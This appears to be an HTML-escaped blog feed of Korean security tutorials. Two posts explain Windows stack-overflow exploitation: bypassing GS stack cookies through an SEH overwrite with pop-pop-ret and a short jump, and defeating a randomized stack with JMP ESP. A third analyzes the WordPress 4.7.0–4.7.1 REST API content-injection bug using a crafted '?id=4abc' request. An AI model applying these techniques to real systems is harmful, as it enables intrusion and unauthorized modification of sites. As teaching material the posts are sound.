-&lt;p&gt;다음 그림을 통해 NSEH와 SEH의 구조를 살펴보겠습니다.&lt;/p&gt;
-
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x05_4.png&quot; alt=&quot;[그림 1-4]&quot; /&gt;
-&lt;/figure&gt;
-
-&lt;p&gt;위 그림처럼 EXCEPTION_RECORD는 _next와 _handler로 구성되어 있습니다.&lt;/p&gt;
-
-&lt;p&gt;위에서 이미 설명했듯이 _next는 다음 EXCEPTION_RECORD의 위치를 담고 있습니다.&lt;/p&gt;
-
-&lt;p&gt;_handler는 실제로 에러 처리 과정을 실행할 함수이고, 구조는 아래와 같습니다.&lt;/p&gt;
-
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x05_5.png&quot; alt=&quot;[그림 1-5]&quot; /&gt;
-&lt;/figure&gt;
-
-&lt;p&gt;위 함수 구조와 같이 에러 처리 함수는 4개의 인자를 필요로 하며, 함수 실행 시 실행에 필요한 인자들을 STACK에 구성합니다.&lt;/p&gt;
-
-&lt;p&gt;따라서 에러 처리 함수가 동작되면 STACK 구조는 아래처럼 구성됩니다.&lt;/p&gt;
-
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x05_6.png&quot; alt=&quot;[그림 1-6]&quot; /&gt;
-&lt;/figure&gt;
-
-&lt;p&gt;이 중 우리가 공격에서 유용하게 사용할 값이 EstablierFrame입니다. EstablierFrame은 이전 Frame의 주소를 가지고 있습니다.&lt;/p&gt;
-
-&lt;p&gt;이게 왜 중요할까요?&lt;/p&gt;
-
-&lt;p&gt;다음에서 우회 기법을 설명하며 EstablierFrame 값이 왜 중요한지 같이 알아보겠습니다.&lt;/p&gt;
-
-&lt;h5 id=&quot;seh-overwrite&quot;&gt;SEH Overwrite&lt;/h5&gt;
-
-&lt;p&gt;우리는 지금까지 GS와 SEH의 개념을 살펴보았습니다.&lt;/p&gt;
-
-&lt;p&gt;STACK Cookie를 우호하는데 왜 SEH의 개념이 필요할까요??&lt;/p&gt;
-
-&lt;p&gt;GS가 적용되면 함수 시작 시, 특정 4Byte를 넣고 함수가 종료될 때 4Byte를 검사한다고 했습니다.&lt;/p&gt;
-
-&lt;p&gt;이를 우회하려면? 반드시 4Byte를 알아내서 동일하게 적어줘야겠죠?&lt;/p&gt;
-
-&lt;p&gt;그런데 이 STACK Cookie를 검사하기 전에 프로그램에 치명적인 에러가 발생한다면 어떻게 될까요?&lt;/p&gt;
-
-&lt;p&gt;윈도우는 이 에러를 먼저 처리하려고 하겠죠???&lt;/p&gt;
-
-&lt;p&gt;이 점을 이용하는 겁니다. 지금부터 이 점을 이용해서 STACK Cookie 검사 과정을 우회할 것 입니다.&lt;/p&gt;
-
-&lt;p&gt;어떻게 할 것이냐? 저는 STACK의 끝까지 더미 값을 넣어서 할당된 STACK 공간 밖에 값을 쓰도록 Payload를 구성할 겁니다.&lt;/p&gt;
-
-&lt;p&gt;그러면? 반드시 에러가 발생하겠죠??&lt;/p&gt;
-
-&lt;p&gt;에러가 발생하면 윈도우의 SEH 과정이 실행됩니다.&lt;/p&gt;
-
-&lt;p&gt;지금까지 이야기한 것을 STACK으로 표현하면 다음과 같습니다.&lt;/p&gt;
-
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x05_7.png&quot; alt=&quot;[그림 1-7]&quot; /&gt;
-&lt;/figure&gt;
-
-&lt;p&gt;위 그림을 살펴보면 _next는 Jump to Shellcode, _handler는 &amp;amp; pop pop ret으로 되어 있죠?&lt;/p&gt;
-
-&lt;p&gt;그리고 아래 STACK Frame에 EstablierFrame도 빨간 색으로 표현되어 있네요.&lt;/p&gt;
-
-&lt;p&gt;먼저, EstablierFrame은 이전 Frame의 _next의 주소를 담고 있습니다.&lt;/p&gt;
-
-&lt;p&gt;_handler가 실행되면서 자체적으로 새로운 Frame을 생성하는데 이 함수의 인자 중 하나가 이전 Frame의 주소를 가지고 있으니까&lt;/p&gt;
-
-&lt;p&gt;다시 원래 Frame으로 돌아가서 Shellcode를 실행하도록 만들자는 것이죠.&lt;/p&gt;
-
-&lt;p&gt;그래서 _handler에는 &amp;amp; pop pop ret를 넣어줬습니다.&lt;/p&gt;
-
-&lt;p&gt;함수의 프롤로그 과정을 잘 떠올려보세요. 그럼 _handler가 실행될 때의 ESP는 그림에서 가장 아래에 있을 것이고&lt;/p&gt;
-
-&lt;p&gt;+8 위치에 EstablierFrame가 있죠? 그래서 &amp;amp; pop pop ret을 넣어주는 것입니다.&lt;/p&gt;
-
-&lt;p&gt;&amp;amp; pop pop ret이 실행되면?? _next로 오겠죠?&lt;/p&gt;
-
-&lt;p&gt;그럼 이제 남은 것은 _next에서 Shellcode가 얼마나 떨어져있는지 계산해서 jump code를 구성해주면 됩니다.&lt;/p&gt;
-
-&lt;p&gt;해당 그림에서는 바로 뒤에 Shellcode를 위치시켰습니다.&lt;/p&gt;
-
-&lt;p&gt;그래서 뛰어 넘을 거리는 6Byte!&lt;/p&gt;
-
-&lt;p&gt;4Byte가 아니냐구요? jump 0x06을 기계어로 바꾸면 06 eb가 됩니다. 2 byte짜리 명령어에요.&lt;/p&gt;
-
-&lt;p&gt;그래서 90 90 06 eb로 구성합니다. 그럼 90 90과 &amp;amp; pop pop ret을 뛰어넘어야 하니까 6byte 맞죠?&lt;/p&gt;
-
-&lt;p&gt;아래 그림은 Immunity Debugger를 이용해서 우회 과정을 살펴본 것입니다.&lt;/p&gt;
-
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x05_8.png&quot; alt=&quot;[그림 1-8]&quot; /&gt;
-&lt;/figure&gt;
-
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x05_9.png&quot; alt=&quot;[그림 1-9]&quot; /&gt;
-&lt;/figure&gt;
-
-&lt;p&gt;우회가 잘 되죠??&lt;/p&gt;
-
-&lt;p&gt;지금까지 GS에 대한 설명을 했습니다. 다음 연재에서는 Safe SEH 기법에 대해 설명하겠습니다.&lt;/p&gt;</content><author><name>Joel Park</name></author><category term="Posts" /><summary type="html">0x05 GS</summary></entry><entry><title type="html">windows-0x04</title><link href="/windows-0x04" rel="alternate" type="text/html" title="windows-0x04" /><published>2019-03-03T19:18:00+09:00</published><updated>2019-03-03T19:18:00+09:00</updated><id>/windows-0x04</id><content type="html" xml:base="/windows-0x04">&lt;h1 id=&quot;0x04-random-stack&quot;&gt;0x04 Random STACK&lt;/h1&gt;
-
-&lt;h5 id=&quot;what-is-random-stack&quot;&gt;What is Random STACK?&lt;/h5&gt;
-
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x04_1.png&quot; alt=&quot;[그림 1-1]&quot; /&gt;
-&lt;/figure&gt;
-
-&lt;p&gt;Random STACK은 메모리에서 STACK이 할당되는 주소가 프로그램 실행시마다 변경되는 방어 기법입니다.&lt;/p&gt;
-
-&lt;p&gt;이 방어 기법이 적용되면 Shellcode의 주소를 정확히 알 수가 없기 때문에 기존의 Direct EIP Overwrite로는 공격을 성공할 수가 없습니다.&lt;/p&gt;
-
-&lt;h5 id=&quot;jmp-esp&quot;&gt;JMP ESP&lt;/h5&gt;
-
-&lt;p&gt;Shellcode의 주소를 알 수 없는 상황을 우회하기 위해서 사용하는 방법 중 하나가 “JMP ESP”를 활용하는 것입니다.&lt;/p&gt;
-
-&lt;p&gt;RET 주소에 JMP ESP의 주소를 넣는다는 것인데 어떻게 우회가 가능한지 살펴보겠습니다.&lt;/p&gt;
-
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x04_2.png&quot; alt=&quot;[그림 1-2]&quot; /&gt;
-&lt;/figure&gt;
-
-&lt;p&gt;위 그림은 우리가 지금 실습하고 있는 프로그램의 공격 전/후 STACK 구조입니다.&lt;/p&gt;
-
-&lt;p&gt;Main의 에필로그 과정에서 마지막 RETN이 실행될 때 Shellcode를 실행하러 가기 때문에 그 과정을 살펴보겠습니다.&lt;/p&gt;
-
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x04_3.png&quot; alt=&quot;[그림 1-3]&quot; /&gt;
-&lt;/figure&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;mov esp, ebp : 이전 Frame으로 돌아가기 위해 ESP를 현재 Frame의 기준점으로 데리고 옵니다.&lt;/li&gt;
-  &lt;li&gt;POP ebp : 이전 Frame의 기준 값을 POP하여 EBP에 넣어주어 이전 Frame의 기준 값으로 돌아갑니다.&lt;/li&gt;
-  &lt;li&gt;RETN : POP EIP, JMP EIP을 통해 다음 실행할 곳으로 이동합니다.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;RETN이 일어날 때의 ESP를 유심히 보면, 항상 RET 다음에 위치하고 있다는 것을 확인할 수 있습니다.&lt;/p&gt;
-
-&lt;p&gt;따라서 RET를 &amp;amp;JMP ESP로 해둔다면 다음 실행할 곳의 위치는 RET 다음 위치가 됩니다.&lt;/p&gt;
-
-&lt;p&gt;이 점을 이용하기 위해 Payload의 구성도 다음과 같이 변경됩니다.&lt;/p&gt;
-
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x04_4.png&quot; alt=&quot;[그림 1-4]&quot; /&gt;
-&lt;/figure&gt;
-
-&lt;p&gt;위 Payload와 그림 1-1의 오른편 공격 후 STACK 구조를 다시 봅시다.&lt;/p&gt;
-
-&lt;p&gt;이전과는 다르게 RET 뒤에 Shellcode가 위치하도록 Payload를 구성한 것을 보실 수 있습니다.&lt;/p&gt;
-
-&lt;p&gt;이런 방법을 이용하면 Shellcode의 주소를 정확히 알 수 없는 환경에서도 공격을 성공시킬 수가 있습니다.&lt;/p&gt;
-
-&lt;h5 id=&quot;how-to-find-jmp-esp&quot;&gt;How to Find &amp;amp;JMP ESP?&lt;/h5&gt;
-
-&lt;p&gt;공격의 흐름과 방법은 아마 이제 다들 아실거라 생각됩니다. 그런데 한 가지 의문이 남죠?&lt;/p&gt;
-
-&lt;p&gt;아마도 “&amp;amp;JMP ESP는 어떻게 찾습니까?”일텐데요.&lt;/p&gt;
-
-&lt;p&gt;이번 연재에서는 Immunity Debugger를 통해서 찾는 방법을 알려드리겠습니다.&lt;/p&gt;
-
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x04_5.png&quot; alt=&quot;[그림 1-5]&quot; /&gt;
-&lt;/figure&gt;
-
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x04_6.png&quot; alt=&quot;[그림 1-6]&quot; /&gt;
-&lt;/figure&gt;
-
-&lt;p&gt;Immunity Debugger에서 ALT+M을 하면 메모리 창이 띄어집니다. 메모리 창에서 CTRL+F를 눌러 “FF E4”(=JMP ESP)를 검색하면 아래와 같이 
-JMP ESP의 주소를 찾을 수 있게 됩니다.&lt;/p&gt;
-
-&lt;p&gt;다음 편에서는 GS 기법에 대해 알아보도록 하겠습니다.&lt;/p&gt;</content><author><name>Joel Park</name></author><category term="Posts" /><summary type="html">0x04 Random STACK</summary></entry><entry><title type="html">web-0x01</title><link href="/web-0x01" rel="alternate" type="text/html" title="web-0x01" /><published>2019-02-25T10:20:00+09:00</published><updated>2019-02-25T10:20:00+09:00</updated><id>/web-0x01</id><content type="html" xml:base="/web-0x01">&lt;h1 id=&quot;privilege-escalation--content-injection-on-wordpress-470--471&quot;&gt;Privilege Escalation / Content Injection On Wordpress 4.7.0 ~ 4.7.1&lt;/h1&gt;
-
-&lt;h5 id=&quot;privilege-escalation--content-injection&quot;&gt;Privilege Escalation / Content Injection?&lt;/h5&gt;
-
-&lt;p&gt;Wordpress 4.7.0 버전부터 기본적으로 활성화되는 Wordpress Rest API를 통해 게시물에 대한 접근, 읽기, 수정, 삭제 등의 기능을 사용할 수 있게 되었으며, 기본적으로 사용하게 된 Rest API를 통해 Wordpress 4.7.0과 4.7.1버전에서 Privilege Escaltion / Content Injection 취약점이 발생했습니다.&lt;/p&gt;
-
-&lt;p&gt;Privilege Escalation은 관리자가 작성한 게시물을 포함한 모든 게시물에 접근이 가능한 것을 말하며 Content Injection은 접근이 가능한 게시물의 내용을 변경할 수 있는 것을 뜻합니다.&lt;/p&gt;
-
-&lt;h5 id=&quot;취약점-분석&quot;&gt;취약점 분석&lt;/h5&gt;
-&lt;ul&gt;
-  &lt;li&gt;&lt;strong&gt;환경구성&lt;/strong&gt;&lt;br /&gt;
-    &lt;ul&gt;
-      &lt;li&gt;Apache 2.4.18&lt;br /&gt;&lt;/li&gt;
-      &lt;li&gt;PHP 7.0.30&lt;br /&gt;&lt;/li&gt;
-      &lt;li&gt;Wordpress 4.7.1&lt;br /&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;사용자가 게시물 수정 요청을 하면 서버는 Rest API를 통해 게시물 수정 작업을 하기 위해 class-wp-rest-posts-controller.php에 존재하는 update_item_permission_check 함수와 update_item함수를 콜백합니다.&lt;/p&gt;
-
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/web/0x01_1.png&quot; /&gt;
-  &lt;figcaption&gt;&lt;center&gt;[그림 1-1]
-  게시물 수정 요청 및 처리
-  &lt;/center&gt;&lt;/figcaption&gt;
-&lt;/figure&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;register_rest_route&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;namespace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;rest_base&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/(?P&amp;lt;id&amp;gt;[\d]+)'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'methods'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;             &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;WP_REST_Server&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;READABLE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'callback'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;            &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'get_item'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'permission_callback'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'get_item_permissions_check'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'args'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;                &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$get_item_args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'methods'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;             &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;WP_REST_Server&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;EDITABLE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'callback'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;            &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'update_item'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'permission_callback'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'update_item_permissions_check'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'args'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;                &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;get_endpoint_args_for_item_schema&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;WP_REST_Server&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;EDITABLE&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'methods'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;             &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;WP_REST_Server&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;DELETABLE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'callback'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;            &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'delete_item'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'permission_callback'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'delete_item_permissions_check'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'args'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;                &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;                    &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'force'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;                              &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'type'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'boolean'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;                              &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'default'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;                              &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'description'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Whether to bypass trash and force deletion.'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;                    &lt;/span&gt; &lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
-&lt;span class=&quot;s1&quot;&gt;'schema'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'get_public_item_schema'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;게시물에 대한 작업을 수행하는 Rest API는 JSON 방식으로 통신하며 등록된 경로에 해당하는 요청에 따라 각기 다른 함수를 콜백하게 됩니다. 게시물 수정 시 namespace는 ‘/wp/v2’ 이며, rest_base는 ‘posts’이며 등록된 경로는 ./wp-json/wp/v2/posts/id 입니다.&lt;/p&gt;
-
-&lt;p&gt;서버측에 ./wp-json/wp/v2/posts/id와 같이 요청이 오면 해당 id에 대한 수정작업을 위해 update_item_permissions_check, update_item 함수를 콜백하여 게시물 수정 작업을 수행합니다.&lt;/p&gt;
-
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/web/0x01_2.png&quot; /&gt;
-  &lt;figcaption&gt;&lt;center&gt;[그림 1-2]
-  서버 IP/index.php/wp-json/wp-v2/posts/4 요청
-&lt;/center&gt;&lt;/figcaption&gt;
-&lt;/figure&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;공격자는 ./wp-json/wp/v2/posts/4?id=4abc와 같이 요청을 보내면 id 매개 변수에 4abc 값으로 설정되는 것을 확인할 수 있고 이것을 이용하여 id값이 4인 게시물에 대한 내용 변경하는 공격을 시도해볼 수 있습니다.&lt;/p&gt;
-
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/web/0x01_3.png&quot; /&gt;
-  &lt;figcaption&gt;&lt;center&gt;[그림 1-3]
-  서버IP/index.php/wp-json/wp-v2/posts/4?id=4abc 요청
- &lt;/center&gt;&lt;/figcaption&gt;
-&lt;/figure&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;Privilege Escalation / Content Injection 취약점은 class-wp-rest-posts-controller.php에 존재하는 update_item_permissions_check, update_item에서 권한 체크 문제와 형변환(Cascading) 버그로 발생합니다.&lt;/p&gt;
-
